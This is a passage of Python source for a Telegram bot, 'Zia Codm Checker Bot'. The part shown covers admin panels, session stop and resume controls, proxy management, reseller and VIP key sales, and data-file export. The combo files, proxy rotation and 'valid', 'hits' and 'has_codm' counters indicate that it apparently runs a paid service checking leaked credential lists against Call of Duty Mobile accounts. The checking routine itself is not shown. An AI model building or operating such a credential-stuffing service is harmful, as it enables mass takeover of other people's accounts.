    mc=cfg.get("max_concurrent",5)
    await update.message.reply_text(
        f" <b>Bot Refreshed!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Proxy        : {proxy_status}\n"
        f" Regular limit: <code>{gl}</code>\n"
        f" VIP limit    : <code>{vl}</code>\n"
        f" Threads      : <code>{thr}</code>\n"
        f" Max concurrent: <code>{mc}</code>\n"
        f" Locked       : <code>{'Yes ' if cfg.get('locked') else 'No '}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Running: <code>{live}</code> active session(s)",
        parse_mode=ParseMode.HTML)


@admin_or_mini_admin('stopchecking')
async def cmd_stop_checking(update,context):
    """Show stop options menu."""
    with sessions_lock:
        running=[(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    vip_cnt  = sum(1 for uid2,_ in running if users_db.get(uid2,{}).get("vip"))
    nvip_cnt = len(running)-vip_cnt
    kb=InlineKeyboardMarkup([
        [InlineKeyboardButton(f" Stop ALL ({len(running)})",      callback_data="admstop_all")],
        [InlineKeyboardButton(f" Stop Non-VIP ({nvip_cnt})",      callback_data="admstop_nonvip"),
         InlineKeyboardButton(f" Stop VIP ({vip_cnt})",           callback_data="admstop_vip")],
        [InlineKeyboardButton(f" Stop One User…",                  callback_data="admstop_oneuser")],
    ])
    await update.message.reply_text(
        f" <b>Stop Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Running  : <code>{len(running)}</code>\n"
        f" VIP      : <code>{vip_cnt}</code>\n"
        f" Non-VIP  : <code>{nvip_cnt}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\nChoose who to stop:",
        reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_or_mini_admin('continuechecking')
async def cmd_continue_checking(update,context):
    """Show continue options menu."""
    # Find admin-stopped sessions (status=stopped_by_admin)
    with sessions_lock:
        stopped=[(uid2,s) for uid2,s in active_sessions.items()
                 if s.get("status")=="stopped_by_admin" and s.get("file") and Path(s["file"]).exists()]
    if not stopped:
        await update.message.reply_text(" No admin-stopped sessions to resume.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    vip_cnt  = sum(1 for uid2,_ in stopped if users_db.get(uid2,{}).get("vip"))
    nvip_cnt = len(stopped)-vip_cnt
    kb=InlineKeyboardMarkup([
        [InlineKeyboardButton(f" Continue ALL ({len(stopped)})",  callback_data="admcont_all")],
        [InlineKeyboardButton(f" Continue Non-VIP ({nvip_cnt})", callback_data="admcont_nonvip"),
         InlineKeyboardButton(f" Continue VIP ({vip_cnt})",      callback_data="admcont_vip")],
        [InlineKeyboardButton(f" Continue One User…",             callback_data="admcont_oneuser")],
    ])
    await update.message.reply_text(
        f" <b>Continue Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Admin-stopped : <code>{len(stopped)}</code>\n"
        f" VIP           : <code>{vip_cnt}</code>\n"
        f" Non-VIP       : <code>{nvip_cnt}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\nChoose who to continue:",
        reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_user(update,context):
    """Show running users with individual stop buttons."""
    with sessions_lock:
        running=[(uid2,dict(s)) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users(); lines=[" <b>Stop a User</b>\n━━━━━━━━━━━━━━━━━━━━"]; btns=[]
    for uid2,s in running:
        udata=users_db.get(uid2,{}); uname=udata.get("username","?"); fname_u=udata.get("first_name","?")
        vip_tag="" if udata.get("vip") else ""
        combo=Path(s.get("file","")).name if s.get("file") else "N/A"
        ls2=s.get("live_stats"); st=ls2.get_stats() if ls2 else {}
        lines.append(f"{vip_tag} <b>{fname_u}</b> @{uname} — <code>{combo}</code> hits:{st.get('has_codm',0)}")
        btns.append([InlineKeyboardButton(f" Stop {fname_u} (@{uname})",callback_data=f"admstop_uid_{uid2}")])
    await update.message.reply_text(
        "\n".join(lines), reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_vip(update,context):
    """Stop all VIP sessions."""
    await _adm_stop_by_filter(update.message, context.bot, "vip")


@admin_only
async def cmd_stop_nonvip(update,context):
    """Stop all non-VIP sessions."""
    await _adm_stop_by_filter(update.message, context.bot, "nonvip")


# ── Shared stop/continue helpers ──────────────────────────────────────────
async def _adm_stop_by_filter(target_msg, bot, mode):
    """Stop sessions by filter. mode: all | vip | nonvip | uid:<uid>"""
    users_db=load_users(); stopped=0; loop=asyncio.get_event_loop()
    with sessions_lock:
        for uid2,s in list(active_sessions.items()):
            if s.get("status")!="checking": continue
            is_vip=users_db.get(uid2,{}).get("vip",False)
            match=(mode=="all") or (mode=="vip" and is_vip) or                   (mode=="nonvip" and not is_vip) or (mode==f"uid:{uid2}")
            if not match: continue
            s["stop_event"].set()
            s["status"]="stopped_by_admin"
            stopped+=1
            cid2=s.get("chat_id")
            uname2=users_db.get(uid2,{}).get("username","?")
            if cid2:
                try:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_message(chat_id=cid2,parse_mode=ParseMode.HTML,
                            text=" <b>Checking stopped by admin.</b>\n"
                                 "Your file is safe. Admin can resume your session anytime."),loop)
                except: pass
    label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}.get(mode, mode.replace("uid:","User "))
    await target_msg.reply_text(
        f" <b>Stopped ({label})</b>\n<code>{stopped}</code> session(s) stopped.\n"
        f"Use /continuechecking to resume.",
        parse_mode=ParseMode.HTML)


async def _adm_continue_by_filter(query, bot, mode):
    """Continue admin-stopped sessions. Re-launches checker thread for each."""
    users_db=load_users(); resumed=0; loop=asyncio.get_event_loop()

    with sessions_lock:
        targets=[(uid2,dict(s)) for uid2,s in active_sessions.items()
                 if s.get("status")=="stopped_by_admin"
                 and s.get("file") and Path(s["file"]).exists()]

    for uid2,snap in targets:
        is_vip=users_db.get(uid2,{}).get("vip",False)
        match=(mode=="all") or (mode=="vip" and is_vip) or \
              (mode=="nonvip" and not is_vip) or (mode==f"uid:{uid2}")
        if not match: continue

        new_stop=threading.Event()
        with sessions_lock:
            if uid2 not in active_sessions: continue
            active_sessions[uid2]["stop_event"]=new_stop
            active_sessions[uid2]["status"]="checking"

        cid2=snap.get("chat_id"); fpath=snap.get("file","")
        cfg2=load_config()
        lk=snap.get("lvl_key","lvl_all"); ck=snap.get("cf_key","cf_both")
        lim2=cfg2.get("vip_limit") if is_vip else cfg2.get("global_limit")
        ll2=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])
        cl2=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])
        rf2=Path(snap.get("result_folder",str(RESULTS_DIR/uid2/datetime.now().strftime("%Y%m%d_%H%M%S"))))
        rf2.mkdir(parents=True,exist_ok=True)
        ts2=datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                rem2=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem2=0
        disp2=min(lim2,rem2) if lim2 else rem2

        if cid2:
            try:
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(chat_id=cid2,parse_mode=ParseMode.HTML,
                        text=" <b>Checking resumed by admin!</b>\n Hits will be sent here live."),loop)
            except: pass

        persist_session(uid2,{
            "file":fpath,"chat_id":cid2,"lvl_key":lk,"cf_key":ck,
            "username":users_db.get(uid2,{}).get("username",""),
            "first_name":users_db.get(uid2,{}).get("first_name",""),
            "status":"checking","result_folder":str(rf2),"orig_total":disp2,
        })

        def _make_cont_bg(u,fp,rf_p,lim_n,ll_o,cl_o,nstop,cid_n,disp_n,ts_n,cfg_n):
            def _bg():
                _enqueue(u); pos=_queue_pos(u)
                if pos>1:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_message(chat_id=cid_n,parse_mode=ParseMode.HTML,
                            text=f" Queue #{pos}. Waiting…"),loop)
                _checker_semaphore.acquire(); _dequeue(u)
                with sessions_lock:
                    if active_sessions.get(u,{}).get("status")!="checking":
                        _checker_semaphore.release(); return
                fin=run_checker(u,fp,rf_p,lim_n,ll_o["threshold"],nstop,
                                cfg_n["bot_token"],cf_filter=cl_o["filter"],
                                result_folder=rf_p,chat_id=cid_n,loop=loop)
                _checker_semaphore.release()
                with sessions_lock:
                    if u in active_sessions:
                        active_sessions[u]["status"]="done"
                        try:
                            _ls=active_sessions[u].get("live_stats")
                            _ps3=active_sessions[u].get("prev_stats",{})
                            _pp3=active_sessions[u].get("prev_processed",0)
                            _cs3=_ls.get_stats() if _ls else (fin or {})
                            _fs3=dict(_cs3)
                            if _ps3:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    _fs3[_k]=_cs3.get(_k,0)+_ps3.get(_k,0)
                            _fs3["total"]=_pp3+_cs3.get("total",0)
                            active_sessions[u]["final_stats"]=_fs3
                        except: pass
                zo=rf_p/f"results_{u}_{ts_n}.zip"; zp=zip_results(rf_p,zo)
                asyncio.run_coroutine_threadsafe(
                    deliver_results(bot,cid_n,u,zp,fin or {},combo_file=fp),loop)
                clear_persisted_session(u)
                with sessions_lock:
                    if u in active_sessions: del active_sessions[u]
            return _bg

        t2=threading.Thread(
            target=_make_cont_bg(uid2,fpath,rf2,lim2,ll2,cl2,new_stop,cid2,disp2,ts2,cfg2),
            daemon=True,name=f"checker-{uid2}")
        t2.start()
        resumed+=1

    label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}.get(mode,mode.replace("uid:","User "))
    await query.edit_message_text(
        f" <b>Resumed ({label})</b>\n<code>{resumed}</code> session(s) restarted.",
        parse_mode=ParseMode.HTML)



@admin_or_mini_admin('refreshcombo')
async def cmd_refresh_combo(update,context):
    """Send each user their own combo file back, stop checking, delete, then auto-resume."""
    import shutil
    users_db2=load_users()
    loop=asyncio.get_event_loop()
    msg=await update.message.reply_text(" Sending combo files back to users then deleting…",parse_mode=ParseMode.HTML)

    sent_count=0; del_count=0; resume_count=0

    for uid_dir in sorted(COMBO_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        files=list(uid_dir.glob("*.txt"))
        if not files: continue
        uid2=uid_dir.name
        udata=users_db2.get(uid2,{}); uname2=udata.get("username","?"); fname2=udata.get("first_name","?")

        # Get user's chat_id from session or persisted data
        with sessions_lock: sess2=dict(active_sessions.get(uid2,{}))
        cid2=sess2.get("chat_id")
        if not cid2:
            # Try persisted session
            try:
                import json as _json
                ps=_json.loads(SESSIONS_FILE.read_text()) if SESSIONS_FILE.exists() else {}
                cid2=ps.get(uid2,{}).get("chat_id")
            except: pass

        is_checking=sess2.get("status")=="checking"

        # 1. Send combo file back to the USER (not admin)
        if cid2:
            for f in files:
                try:
                    with open(f,"rb") as fh:
                        await context.bot.send_document(
                            chat_id=int(cid2),
                            document=fh,
                            filename=f.name,
                            caption=" <b>Your combo file — saved before reset by admin.</b>",
                            parse_mode=ParseMode.HTML)
                    sent_count+=1
                except: pass

        # 2. Stop active session
        if is_checking:
            with sessions_lock:
                active_sessions.get(uid2,{}).get("stop_event",threading.Event()).set()

        # 3. Delete combo files + uid folder
        uid_combo_dir = files[0].parent if files else None
        for f in files:
            try: f.unlink(); del_count+=1
            except: pass
        # Remove combo/{uid}/ folder if now empty
        if uid_combo_dir and uid_combo_dir.exists() and uid_combo_dir != COMBO_DIR:
            try:
                if not any(uid_combo_dir.iterdir()): uid_combo_dir.rmdir()
            except: pass

        # 4. Clear session + persist
        clear_persisted_session(uid2)
        with sessions_lock:
            if uid2 in active_sessions:
                del active_sessions[uid2]

        # 5. Notify user
        if cid2:
            try:
                await context.bot.send_message(
                    chat_id=int(cid2),
                    parse_mode=ParseMode.HTML,
                    text=" <b>Admin cleared your combo file.</b>\nYour file was sent back to you above.\nUpload a new file to continue checking.")
            except: pass

        if is_checking: resume_count+=1

    await msg.edit_text(
        f" <b>Combo Refresh Done!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Sent to users : <code>{sent_count}</code> file(s)\n"
        f" Deleted       : <code>{del_count}</code> file(s)\n"
        f" Stopped       : <code>{resume_count}</code> active session(s)",
        parse_mode=ParseMode.HTML)


@admin_or_mini_admin('refreshresults')
async def cmd_refresh_results(update,context):
    """Send each user their results as zip, delete result folders, auto-resume if still checking."""
    import shutil
    users_db3=load_users()
    loop=asyncio.get_event_loop()
    msg=await update.message.reply_text(" Sending results to users then deleting…",parse_mode=ParseMode.HTML)

    sent_count=0; del_count=0; resumed=0

    for uid_dir in sorted(RESULTS_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        all_files=[f for f in uid_dir.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
        zips=list(uid_dir.glob("*.zip"))
        if not all_files and not zips: continue

        uid3=uid_dir.name
        udata3=users_db3.get(uid3,{}); uname3=udata3.get("username","?"); fname3=udata3.get("first_name","?")

        # Get user chat_id
        with sessions_lock: sess3=dict(active_sessions.get(uid3,{}))
        cid3=sess3.get("chat_id")
        if not cid3:
            try:
                import json as _j2
                ps2=_j2.loads(SESSIONS_FILE.read_text()) if SESSIONS_FILE.exists() else {}
                cid3=ps2.get(uid3,{}).get("chat_id")
            except: pass

        is_checking3=sess3.get("status")=="checking"
        active_rf3=sess3.get("result_folder","")

        # Build stats snapshot from live_stats if available
        ls3=sess3.get("live_stats")
        snap3=ls3.get_stats() if ls3 else {}

        # Zip all result files (excluding active result folder if still checking)
        files_to_zip=[]
        for f in all_files+zips:
            # Skip files inside the active result folder if still checking
            if active_rf3 and str(f).startswith(active_rf3): continue
            files_to_zip.append(f)

        if files_to_zip and cid3:
            try:
                ts3=datetime.now().strftime("%Y%m%d_%H%M%S")
                bzip3=uid_dir/f"results_{uid3}_{ts3}.zip"
                with zipfile.ZipFile(bzip3,"w",zipfile.ZIP_DEFLATED) as zf:
                    for rf3 in files_to_zip:
                        try: zf.write(rf3,rf3.relative_to(uid_dir))
                        except: pass
                # Send to USER
                with open(bzip3,"rb") as fh:
                    await context.bot.send_document(
                        chat_id=int(cid3),
                        document=fh,
                        filename=bzip3.name,
                        caption=(f" <b>Your results</b> — sent by admin\n"
                                 f" {snap3.get('valid',0)}   {snap3.get('has_codm',0)}  "
                                 f" {snap3.get('clean',0)}"),
                        parse_mode=ParseMode.HTML)
                sent_count+=1
                bzip3.unlink()
            except Exception as e:
                log.warning(f"refreshresults send failed for {uid3}: {e}")

        # Delete all OLD result subfolders (skip active one if checking)
        for sub in sorted(uid_dir.iterdir()):
            if not sub.is_dir(): continue
            if active_rf3 and str(sub)==active_rf3: continue
            try: del_result_folder(sub); del_count+=1
            except: pass
        # Remove uid-level folder too if now empty and user not checking
        if not is_checking3:
            try:
                if uid_dir.exists() and not any(uid_dir.iterdir()):
                    uid_dir.rmdir()
            except: pass

        # If not checking — also clear their result_folder reference
        if not is_checking3:
            with sessions_lock:
                if uid3 in active_sessions:
                    active_sessions[uid3].pop("result_folder",None)

        # Auto-resume: if was checking, their active session continues untouched
        if is_checking3:
            resumed+=1
            # Notify user results were sent
            if cid3:
                try:
                    await context.bot.send_message(
                        chat_id=int(cid3),
                        parse_mode=ParseMode.HTML,
                        text=" <b>Your current results were sent above.</b>\nChecking continues — new results will come when done.")
                except: pass

    await msg.edit_text(
        f" <b>Results Refresh Done!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Sent to users  : <code>{sent_count}</code> result zip(s)\n"
        f" Deleted old    : <code>{del_count}</code> folder(s)\n"
        f" Still checking : <code>{resumed}</code> session(s) untouched",
        parse_mode=ParseMode.HTML)




@admin_or_mini_admin('checkrunning')
async def cmd_check_running(update,context):
    """Show all users currently running a checker."""
    with sessions_lock:
        running=[(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active checking sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    lines=[f" <b>Running Sessions ({len(running)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid2,s in running:
        udata=users_db.get(uid2,{}); uname=udata.get("username","?"); fname=udata.get("first_name","?")
        combo=Path(s.get("file","")).name if s.get("file") else "N/A"
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
        cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]
        ls2=s.get("live_stats")
        st=ls2.get_stats() if ls2 else {}
        try:
            with open(s["file"],"r",encoding="utf-8",errors="ignore") as _f:
                rem=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem=0
        orig=s.get("orig_total",0)
        # Use LiveStats.total as accurate processed counter
        done_n=st.get("total",0)
        pct=int(done_n/orig*100) if orig else 0
        lines.append(
            f"\n <b>{fname}</b> @{uname} (<code>{uid2}</code>)\n"
            f" {combo}\n"
            f" {ll}   {cl}\n"
            f" {done_n:,}/{orig:,} ({pct}%)   Valid:{st.get('valid',0)}   CODM:{st.get('has_codm',0)}")
    await update.message.reply_text("\n".join(lines),parse_mode=ParseMode.HTML)


def _admin_main_kb(cfg, context=None):
    locked = cfg.get("locked", False)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Keys", callback_data="adm_keys"),
         InlineKeyboardButton(" Users", callback_data="adm_users")],
        [InlineKeyboardButton(" Proxy", callback_data="adm_proxy"),
         InlineKeyboardButton(" Settings", callback_data="adm_settings")],
        [InlineKeyboardButton(" Files", callback_data="adm_files"),
         InlineKeyboardButton(" Stats", callback_data="adm_stats")],
        [InlineKeyboardButton(" Lock Bot" if not locked else " Unlock Bot",
                              callback_data="adm_toggle_lock"),
         InlineKeyboardButton(" Refresh", callback_data="adm_refresh")],
        [InlineKeyboardButton(" Running Now", callback_data="adm_running")],
    ])

def _admin_status_text(cfg, users):
    ac  = sum(1 for u in users.values() if u.get("activated"))
    bc  = sum(1 for u in users.values() if u.get("banned"))
    vc  = sum(1 for u in users.values() if u.get("vip"))
    with sessions_lock:
        live = sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    lock_s = " ON" if cfg.get("locked") else " OFF"
    return (f"{pe(3)} <b>Admin Panel</b> — Zia Codm Checker Bot {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Users   : <code>{len(users)}</code>  {ac}  {bc}  {vc}\n"
            f"{pe(2)} Live    : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code> slots {pe(2)}\n"
            f"{pe(2)} Lock    : {lock_s} {pe(2)}\n"
            f"{pe(1)} Limit   : <code>{cfg.get('global_limit') or 'Unlimited'}</code>  "
            f"<code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Choose a section:")

def _admin_keys_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Hours Key",     callback_data="adm_genkey_hours"),
         InlineKeyboardButton(" Days Key",      callback_data="adm_genkey_days")],
        [InlineKeyboardButton(" Months Key",    callback_data="adm_genkey_months"),
         InlineKeyboardButton(" Lifetime Key",  callback_data="adm_genkey_lifetime")],
        [InlineKeyboardButton(" Remove All",    callback_data="adm_rmkey_all"),
         InlineKeyboardButton(" Remove VIP",    callback_data="adm_rmkey_vip")],
        [InlineKeyboardButton(" Remove Non-VIP",callback_data="adm_rmkey_nonvip")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_users_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Add VIP",       callback_data="adm_ask_addvip"),
         InlineKeyboardButton(" Remove VIP",    callback_data="adm_ask_rmvip")],
        [InlineKeyboardButton(" Ban User",      callback_data="adm_ask_ban"),
         InlineKeyboardButton(" Unban User",    callback_data="adm_ask_unban")],
        [InlineKeyboardButton(" All Users",     callback_data="adm_allusers"),
         InlineKeyboardButton(" Running",       callback_data="adm_running")],
        [InlineKeyboardButton(" Broadcast",     callback_data="adm_ask_broadcast")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_proxy_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Upload File",   callback_data="adm_upload_proxy"),
         InlineKeyboardButton(" Status",        callback_data="adm_proxy_status")],
        [InlineKeyboardButton(" Remove Files",  callback_data="adm_remove_proxy"),
         InlineKeyboardButton(" Paste Proxies", callback_data="adm_paste_proxy")],
        [InlineKeyboardButton(" Reload Rotator",callback_data="adm_reload_proxy")],
        [InlineKeyboardButton(" Clean ALL Files (remove dead/errors)",
                              callback_data="chkprx_rmdeadlines_ALL_")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_settings_kb(cfg):
    locked=cfg.get("locked",False)
    lock_lbl=" Unlock Bot" if locked else " Lock Bot"
    lock_cb ="adm_toggle_lock"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(lock_lbl,           callback_data=lock_cb)],
        [InlineKeyboardButton(" Set Limit",     callback_data="adm_ask_limit"),
         InlineKeyboardButton(" VIP Limit",     callback_data="adm_ask_viplimit")],
        [InlineKeyboardButton(" Cooldown",      callback_data="adm_ask_cooldown"),
         InlineKeyboardButton(" Threads",       callback_data="adm_ask_threads")],
        [InlineKeyboardButton(" Concurrent",    callback_data="adm_ask_concurrent"),
         InlineKeyboardButton(" Reload Config", callback_data="adm_do_refresh")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_files_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Clear Combos",         callback_data="adm_ask_refreshcombo"),
         InlineKeyboardButton(" Clear Results",        callback_data="adm_ask_refreshresults")],
        [InlineKeyboardButton("« Back",                  callback_data="adm_back")],
    ])

def _admin_ask(prompt, cb_prefix):
    """Generic 'type a value' prompt keyboard."""
    return InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="adm_back")]])

async def _adm_edit(query, text, kb=None):
    try: await query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except: pass

async def cmd_admin_panel(update,context):
    cfg=load_config(); users=load_users()
    text=_admin_status_text(cfg,users)
    kb=_admin_main_kb(cfg)
    if update.message:
        await update.message.reply_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)
    elif update.callback_query:
        try:
            await update.callback_query.edit_message_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)
        except:
            await update.callback_query.message.reply_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  BOT COMMAND MENU
# ════════════════════════════════════════════
async def _set_bot_commands(app):
    """Set Telegram command menu — user commands for everyone, admin commands for admins only."""
    cfg = load_config()

    # ── User commands ─────────────────────────────────────────────────────
    user_cmds = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
    ]

    # ── Admin commands ────────────────────────────────────────────────────
    admin_cmds = user_cmds + [
        BotCommand("admin",          " Admin panel"),
        BotCommand("generate_key",   " Generate a key"),
        BotCommand("remove_key",     " Remove key(s)"),
        BotCommand("ban_user",       " Ban a user"),
        BotCommand("unban_user",     " Unban a user"),
        BotCommand("addvip",         " Add VIP"),
        BotCommand("removevip",      " Remove VIP"),
        BotCommand("lockall",        " Lock bot"),
        BotCommand("unlockall",      " Unlock bot"),
        BotCommand("stats",          " Bot statistics"),
        BotCommand("checkalluser",   " List all users"),
        BotCommand("checkrunning",   " Who is running"),
        BotCommand("stopchecking",   " Stop checking sessions"),
        BotCommand("continuechecking"," Continue stopped sessions"),
        BotCommand("stopforuser",    " Stop one user"),
        BotCommand("stopforvip",     " Stop VIP sessions"),
        BotCommand("stopnonvip",     " Stop non-VIP sessions"),
        BotCommand("broadcast",      " Broadcast message"),
        BotCommand("checkproxy",    " Check proxy file"),
        BotCommand("pasteproxy",    " Paste proxy lines"),
        BotCommand("upload_proxy",   " Upload proxy file"),
        BotCommand("proxystatus",    " Proxy file status"),
        BotCommand("removeproxy",    " Remove proxy file"),
        BotCommand("pasteproxy",     " Paste proxy lines"),
        BotCommand("checkproxy",     " Check proxy file"),
        BotCommand("reloadbot",      " Restart bot"),
        BotCommand("refreshcombo",   " Clear all combo files"),
        BotCommand("refreshresults", " Clear all results"),
        BotCommand("setlimit",       " Set line limit"),
        BotCommand("setlimitforvip", " Set VIP limit"),
        BotCommand("setcd",          " Set cooldown"),
        BotCommand("setconcurrent",  " Set concurrent slots"),
        BotCommand("refresh",        " Reload config & proxy"),
        BotCommand("setcommands",    " Refresh command menu"),
        BotCommand("reloadbot",      " Fully restart bot process"),
        BotCommand("senddata",       " Send data files"),
        BotCommand("replacefile",    " Replace a data file"),
        BotCommand("stopall",        " Stop all sessions"),
        BotCommand("continueall",    " Continue all stopped"),
        BotCommand("stopforvip",     " Stop all VIP sessions"),
        BotCommand("stopfornonvip",  " Stop all non-VIP sessions"),
        BotCommand("stopforuser",    " Stop/manage one user"),
        BotCommand("miniadminpanel",      " Add/manage mini admin"),
        BotCommand("removeminiadmin",     " Remove mini admin"),
        BotCommand("miniadminlist",       " List all mini admins"),
        BotCommand("miniadmininfo",       " Mini admin activity log"),
    ]

    reseller_cmds = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
        BotCommand("miniadminpanel", " Mini Admin panel"),
        BotCommand("rgenkey",        " Generate a key"),
    ]

    ok_admins = []; fail_admins = []
    try:
        await app.bot.set_my_commands(user_cmds)
        await app.bot.set_my_commands(user_cmds, scope=BotCommandScopeAllPrivateChats())
        for admin_id in cfg.get("admin_ids", []):
            try:
                await app.bot.set_my_commands(admin_cmds, scope=BotCommandScopeChat(chat_id=int(admin_id)))
                ok_admins.append(admin_id)
            except Exception as e:
                fail_admins.append(admin_id)
                log.warning(f"Could not set admin commands for {admin_id}: {e}")
        rs_db = load_resellers()
        for rs_uid, rd in rs_db.items():
            if not rd.get("active"): continue
            try:
                await app.bot.set_my_commands(reseller_cmds, scope=BotCommandScopeChat(chat_id=int(rs_uid)))
            except Exception as e:
                log.warning(f"Could not set reseller commands for {rs_uid}: {e}")
    except Exception as e:
        log.warning(f"Could not set bot commands: {e}")
    return ok_admins, fail_admins


@admin_only
async def cmd_send_data(update, context):
    """
    /senddata               — Send all files in data/ folder
    /senddata config        — Send only config.json
    /senddata users         — Send only users.json
    /senddata keys          — Send only keys.json
    /senddata sessions      — Send only sessions_persist.json
    /senddata miniadmins    — Send only mini_admins.json
    /senddata all           — Send all (same as no args)
    """
    tg = update.effective_user

    # Map shorthand → actual file
    DATA_FILES = {
        "config":      CONFIG_FILE,
        "users":       USERS_FILE,
        "keys":        KEYS_FILE,
        "sessions":    SESSIONS_FILE,
        "miniadmins":  MINI_ADMINS_FILE,
        "resellers":   RESELLERS_FILE,
    }

    # Decide which files to send
    arg = context.args[0].lower() if context.args else "all"

    if arg != "all" and arg in DATA_FILES:
        targets = {arg: DATA_FILES[arg]}
    else:
        # Send all existing files in data/ folder
        targets = {f.stem: f for f in sorted(DATA_DIR.iterdir())
                   if f.is_file() and f.suffix in (".json",".txt")}

    if not targets:
        await update.message.reply_text(" No files found in data/ folder.", parse_mode=ParseMode.HTML)
        return

    msg = await update.message.reply_text(
        f" <b>Sending {len(targets)} file(s)…</b>", parse_mode=ParseMode.HTML)

    sent = 0; failed = []
    for name, fpath in targets.items():
        if not fpath.exists():
            failed.append(f"<code>{fpath.name}</code> — not found")
            continue
        try:
            sz = fpath.stat().st_size
            sz_str = f"{sz/1024:.1f} KB" if sz < 1024*1024 else f"{sz/1024/1024:.2f} MB"
            caption = (f" <b>{fpath.name}</b>\n"
                       f" Size : <code>{sz_str}</code>\n"
                       f" Time : <code>{datetime.now().strftime('%Y-%m-%d %H:%M')}</code>")
            with open(fpath, "rb") as f:
                await context.bot.send_document(
                    chat_id=tg.id,
                    document=f,
                    filename=fpath.name,
                    caption=caption,
                    parse_mode=ParseMode.HTML)
            sent += 1
        except Exception as e:
            failed.append(f"<code>{fpath.name}</code> — {str(e)[:60]}")

    result = (f" <b>Data Files Sent!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
              f" Sent    : <code>{sent}</code> file(s)\n")
    if failed:
        result += f" Failed  : <code>{len(failed)}</code>\n" + "\n".join(failed)
    result += (f"\n━━━━━━━━━━━━━━━━━━━━\n"
               f" Use /replacefile to restore any of these files.")
    await msg.edit_text(result, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_replace_file(update, context):
    """
    /replacefiles           — Ready mode: just send any .json file next and it auto-replaces
    /replacefiles config    — Same but confirms which file you're about to replace
    No need to type the filename — just /replacefiles then send the file!
    """
    tg = update.effective_user; uid = str(tg.id)

    REPLACEABLE = {
        "config.json":           CONFIG_FILE,
        "users.json":            USERS_FILE,
        "keys.json":             KEYS_FILE,
        "sessions_persist.json": SESSIONS_FILE,
